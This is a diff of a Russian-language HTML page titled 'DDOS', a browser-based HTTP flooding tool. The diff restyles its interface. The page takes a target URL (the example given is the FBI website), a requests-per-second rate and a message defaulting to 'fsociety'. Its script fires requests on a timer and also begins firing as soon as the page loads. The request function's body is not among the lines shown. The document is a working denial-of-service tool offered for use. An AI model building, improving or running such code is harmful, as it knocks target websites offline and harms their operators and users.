@@ -1,58 +1,55 @@
 <!DOCTYPE html>
-<html lang="ru" style="justify-content: center">
+<html lang="ru">
 
 <head>
     <meta charset="UTF-8">
     <title>DDOS</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
     <link rel="stylesheet" href="style.css">
 </head>
 
-<body style=" background-color: black; justify-content: center;">
-    <div id="header">
-        <img src="https://res.cloudinary.com/teepublic/image/private/s--bD4eJcrz--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1481594297/production/designs/940052_1.jpg" alt="" style="width: 250px">
-    </div>
-    <div class="input_table">
-        <fieldset style="width=1200px; height=200px; align-content: center; color: azure; border: 0;">
-            <legend style=" font-family: fantasy;">Введите URL: </legend>
-            <label> <input type="text" id="targetURL" style="background-color: black; color: aliceblue; border-radius: 10px; align-content: center; width:250px; height: 32px; font-size: 24px"></label>
-        </fieldset>
-        
-     </div>   
-        
-    <div class="options_table" style="width:250px; height:auto; border-radius: 10px; border: white solid 2px">
-        <fieldset style="color: aliceblue; font-family: fantasy; width: 250px; border: 0;">
-            <legend>Опции</legend>
-            <label>Пакетов в секунду : <input style="" id="rps" value="100" /></label><br />
+<body>
 
-            <label>Сообщение : <br /><input style="" id="message" value="..." /></label>
-        </fieldset>
-    </div>  
-        
-   
-        
-    <div>
-        <fieldset style="border:0">
-            <button id="fireButton" style="width: 200px; height: 200px; border-radius: 100px; background-color: firebrick; font-family: fantasy; font-size: 24px; color: azure; border: black solid 10px">
-                    !BOMB!
-            </button>
-        </fieldset>
+
+    <div class="main">
+        <div class="logo">
+            DDOS
+        </div>
+        <div class="content">
+            <div class="target">
+                <legend>Введите URL</legend>
+                <input type="text" id="targetURL" class="form-group">
+            </div>
+            <span>Пример: https://www.fbi.gov/</span>
+            <div class="setup">
+                <legend>Количество пакетов/сек</legend>
+                <input type="text" id="rps" value="100" class="form-group">
+                <legend>Сообщение</legend>
+                <input type="text" id="message" value="fsociety" class="form-group">
+            </div>
+            <div class="start">
+                <button id="fireButton">
+                    !НАЧАТЬ!
+                </button>
+            </div>
+            <div class="stat">
+                <legend style="color: black">Статус:</legend>
+                <dl>
+                    <dt style="color: azure">Отправлено:</dt>
+                    <dd id="requestedCtr" style="color: aliceblue">0</dd>
+                    <dt style="opacity: 0.5; color: lightgreen;">Отправлено OK :</dt>
+
+                    <dd style="opacity: 0.5; color: aliceblue" id="succeededCtr">0</dd>
+                    <dt style="opacity: 0.5; color: lightcoral;">Отправлено неудачно :</dt>
+                    <dd style="opacity: 0.5; color: aliceblue" id="failedCtr">0</dd>
+                </dl>
+            </div>
+        </div>
+        <div class="footer">
+            Created by <span>UserName</span>
+        </div>
     </div>
 
-    <div style="width:250px; height:160px; border: solid white 2px; border-radius: 10px">
-        <fieldset style="width:100%; height:100%; border: 0">
-            <legend style="color: aliceblue">Статус:</legend>
-            <dl>
-                <dt style="color: azure">Отправлено:</dt>
-                <dd id="requestedCtr" style="color: aliceblue">0</dd>
-                <dt style="opacity: 0.5; color: lightgreen;">Отправлено OK :</dt>
-
-                <dd style="opacity: 0.5; color: aliceblue" id="succeededCtr">0</dd>
-                <dt style="opacity: 0.5; color: lightcoral;">Отправлено неудачно :</dt>
-                <dd style="opacity: 0.5; color: aliceblue" id="failedCtr" >0</dd>
-            </dl>
-        </fieldset>
-    </div>
-    
 
     <script>
         (function() {
@@ -123,10 +120,10 @@
                 if (isFiring) {
                     clearInterval(fireInterval);
                     isFiring = false;
-                    this.innerHTML = "START";
+                    this.innerHTML = "!НАЧАТЬ!";
                 } else {
                     isFiring = true;
-                    this.innerHTML = "Stop flooding";
+                    this.innerHTML = "Стоп";
 
                     fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
                 }
@@ -135,8 +132,10 @@
         })();
 
         isFiring = true;
-        document.getElementById("fireButton").innerHTML = "Stop flooding";
+        document.getElementById("fireButton").innerHTML = "Начать";
         fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
-    </script>
 
-</body></html>
+    </script>
+</body>
+
+</html>
